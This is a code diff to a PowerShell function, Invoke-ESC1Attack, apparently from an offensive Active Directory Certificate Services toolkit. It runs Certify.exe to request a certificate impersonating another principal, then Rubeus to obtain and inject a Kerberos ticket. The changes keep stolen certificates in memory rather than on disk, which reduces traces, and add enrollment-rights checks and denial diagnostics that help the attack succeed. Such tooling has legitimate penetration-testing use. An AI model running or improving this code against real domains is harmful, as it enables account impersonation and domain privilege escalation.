@@ -36,7 +36,8 @@ function Invoke-ESC1Attack {
         folder (.\Binaries\Rubeus.exe). Used for automatic TGT request after certificate issuance.
 
         .PARAMETER OutputPath
-        Directory where certificate files (.pfx) will be saved. Defaults to current directory.
+        Directory for temporary operations. Defaults to current directory. Note: Certificates
+        are kept in memory and not saved to files.
 
         .PARAMETER TargetPrincipal
         DirectoryEntry object representing the security principal to impersonate in the certificate.
@@ -52,7 +53,7 @@ function Invoke-ESC1Attack {
 
         .OUTPUTS
         PSCustomObject
-        Returns attack result with certificate details, file paths, and execution status.
+        Returns attack result with base64 certificate data, target details, and execution status.
 
         .EXAMPLE
         # Attack a vulnerable template
@@ -217,7 +218,7 @@ function Invoke-ESC1Attack {
                 Success = $false
                 TemplateName = $TemplateObject.Properties['name'].Value
                 Error = "Invalid input: Not a certificate template"
-                CertificatePath = $null
+                Certificate = $null
                 CertifyOutput = $null
             }
         }
@@ -244,6 +245,31 @@ function Invoke-ESC1Attack {
         
         if (-not $pendingDisabled) {
             Write-Warning "Template '$templateName' requires manager approval (CT_FLAG_PEND_ALL_REQUESTS set)"
+            Write-Warning "This will likely cause the certificate request to be denied by policy"
+        }
+        
+        # Check if current user has enrollment permissions
+        try {
+            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+            $currentUserSid = $currentUser.User.Value
+            $templateSecurity = $TemplateObject.ObjectSecurity
+            
+            # Check for Enroll rights
+            $enrollGuid = [System.Guid]::new('0e10c968-78fb-11d2-90d4-00c04f79dc55')
+            $hasEnrollRights = $templateSecurity.Access | Where-Object {
+                $_.IdentityReference.Value -eq $currentUserSid -and 
+                $_.ObjectType -eq $enrollGuid -and 
+                $_.AccessControlType -eq 'Allow'
+            }
+            
+            if (-not $hasEnrollRights) {
+                Write-Warning "Current user ($($currentUser.Name)) may not have Enroll rights on template '$templateName'"
+                Write-Warning "This could cause the certificate request to be denied"
+            } else {
+                Write-Verbose "Current user has Enroll rights on template '$templateName'"
+            }
+        } catch {
+            Write-Verbose "Could not check enrollment permissions: $($_.Exception.Message)"
         }
         
         # Determine target principal SID
@@ -279,7 +305,7 @@ function Invoke-ESC1Attack {
                     Success = $false
                     TemplateName = $templateName
                     Error = "Invalid target principal"
-                    CertificatePath = $null
+                    Certificate = $null
                     CertifyOutput = $null
                 }
             }
@@ -310,7 +336,7 @@ function Invoke-ESC1Attack {
                     Success = $false
                     TemplateName = $templateName
                     Error = "Could not determine target principal"
-                    CertificatePath = $null
+                    Certificate = $null
                     CertifyOutput = $null
                 }
             }
@@ -362,22 +388,17 @@ function Invoke-ESC1Attack {
                     Success = $false
                     TemplateName = $templateName
                     Error = "Could not discover Certificate Authority"
-                    CertificatePath = $null
+                    Certificate = $null
                     CertifyOutput = $null
                 }
             }
         }
         
-        # Construct certificate file path
-        $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
-        $certFileName = "ESC1-$templateName-$timestamp.out"
-        $certFilePath = Join-Path -Path $OutputPath -ChildPath $certFileName
-        
         # Determine UPN value for Certify command (prefer UPN, fallback to NTAccount)
         $upnValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
         Write-Verbose "Using UPN value for certificate request: $upnValue"
         
-        # Build Certify.exe command arguments
+        # Build Certify.exe command arguments (without --out-file)
         $certifyArgs = @(
             "request"
             "--ca"
@@ -388,8 +409,6 @@ function Invoke-ESC1Attack {
             $targetSID
             "--upn"
             $upnValue
-            "--out-file"
-            $certFilePath
         )
         
         Write-Verbose "Certify command: $CertifyPath $($certifyArgs -join ' ')"
@@ -404,19 +423,29 @@ function Invoke-ESC1Attack {
                 $exitCode = $LASTEXITCODE
                 
                 Write-Verbose "Certify.exe exit code: $exitCode"
-                Write-Verbose "Certify.exe output: $certifyOutput"
+                Write-Verbose "Certify.exe output: $($certifyOutput -join "`n")"
                 
-                if ($exitCode -eq 0 -and (Test-Path -Path $certFilePath)) {
+                if ($exitCode -eq 0) {
                     Write-Host "[+] ESC1 attack successful!" -ForegroundColor Green
-                    Write-Host "[i] Certificate saved to: $certFilePath" -ForegroundColor Cyan
                     
-                    # Read certificate file and find the longest line
+                    # Extract base64 certificate from Certify output
+                    $certificate = $null
                     try {
-                        $certFileLines = Get-Content -Path $certFilePath
-                        $certificate = $certFileLines | Sort-Object { $_.Length } -Descending | Select-Object -First 1
-                        Write-Verbose "Certificate (longest line): $($certificate.Substring(0, [Math]::Min(50, $certificate.Length)))..."
+                        # Look for the longest base64-like line in the output (certificate data)
+                        $base64Lines = $certifyOutput | Where-Object { 
+                            $_ -match '^[A-Za-z0-9+/]+=*$' -and $_.Length -gt 100 
+                        }
+                        
+                        if ($base64Lines) {
+                            # Get the longest base64 line (likely the certificate)
+                            $certificate = $base64Lines | Sort-Object { $_.Length } -Descending | Select-Object -First 1
+                            Write-Verbose "Extracted certificate (length: $($certificate.Length)): $($certificate.Substring(0, [Math]::Min(50, $certificate.Length)))..."
+                            Write-Host "[i] Certificate extracted from Certify output" -ForegroundColor Cyan
+                        } else {
+                            Write-Warning "Could not find base64 certificate in Certify output"
+                        }
                     } catch {
-                        Write-Warning "Failed to read certificate from file: $($_.Exception.Message)"
+                        Write-Warning "Failed to extract certificate from output: $($_.Exception.Message)"
                         $certificate = $null
                     }
                     
@@ -465,7 +494,7 @@ function Invoke-ESC1Attack {
                     return [PSCustomObject]@{
                         Success = $true
                         TemplateName = $templateName
-                        CertificatePath = $certFilePath
+                        Certificate = $certificate
                         TargetPrincipal = $targetName
                         TargetSID = $targetSID
                         CertificateAuthority = $CertificateAuthority
@@ -476,7 +505,36 @@ function Invoke-ESC1Attack {
                         Error = $null
                     }
                 } else {
-                    throw "Certify.exe failed with exit code $exitCode. Output: $($certifyOutput -join "`n")"
+                    # Analyze specific error types
+                    $outputString = $certifyOutput -join "`n"
+                    $errorMessage = "Certify.exe failed with exit code $exitCode"
+                    
+                    if ($outputString -match "Denied by Policy Module.*0x80094800") {
+                        $errorMessage += "`n`nPolicy Module Error (0x80094800) - Possible causes:"
+                        $errorMessage += "`n- Template requires manager approval (check msPKI-Enrollment-Flag)"
+                        $errorMessage += "`n- User lacks enrollment permissions on the template"
+                        $errorMessage += "`n- CA has additional policy restrictions"
+                        $errorMessage += "`n- Template may not be properly published to the CA"
+                        
+                        # Check template flags for additional context
+                        if (-not $pendingDisabled) {
+                            $errorMessage += "`n- CONFIRMED: Template requires manager approval (msPKI-Enrollment-Flag has CT_FLAG_PEND_ALL_REQUESTS set)"
+                        }
+                        
+                        Write-Warning "Certificate request was denied by CA policy"
+                        Write-Host "Troubleshooting suggestions:" -ForegroundColor Yellow
+                        Write-Host "1. Check if template requires manager approval" -ForegroundColor Yellow
+                        Write-Host "2. Verify current user has Enroll permissions on template" -ForegroundColor Yellow
+                        Write-Host "3. Ensure template is published to the CA" -ForegroundColor Yellow
+                        Write-Host "4. Check CA policy settings" -ForegroundColor Yellow
+                    } elseif ($outputString -match "access.*denied|unauthorized") {
+                        $errorMessage += "`n`nAccess Denied - User may not have enrollment permissions on this template"
+                    } elseif ($outputString -match "template.*not.*found") {
+                        $errorMessage += "`n`nTemplate Not Found - Template may not be published to the CA"
+                    }
+                    
+                    $errorMessage += "`n`nFull Certify output: $outputString"
+                    throw $errorMessage
                 }
                 
             } catch {
@@ -485,7 +543,7 @@ function Invoke-ESC1Attack {
                     Success = $false
                     TemplateName = $templateName
                     Error = $_.Exception.Message
-                    CertificatePath = $certFilePath
+                    Certificate = $null
                     CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
                     RubeusOutput = if ($rubeusOutput) { $rubeusOutput -join "`n" } else { $null }
                     RubeusExitCode = $rubeusExitCode
@@ -496,7 +554,7 @@ function Invoke-ESC1Attack {
             # WhatIf mode
             Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
             Write-Host "What if: Would request certificate with target principal SAN: $targetName ($targetSID)" -ForegroundColor Yellow
-            Write-Host "What if: Would save certificate to: $certFilePath" -ForegroundColor Yellow
+            Write-Host "What if: Would extract certificate from Certify output" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
             Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
             Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /ptt" -ForegroundColor Yellow
@@ -504,7 +562,7 @@ function Invoke-ESC1Attack {
             return [PSCustomObject]@{
                 Success = $true
                 TemplateName = $templateName
-                CertificatePath = $certFilePath
+                Certificate = $null
                 TargetPrincipal = $targetName
                 TargetSID = $targetSID
                 CertificateAuthority = $CertificateAuthority
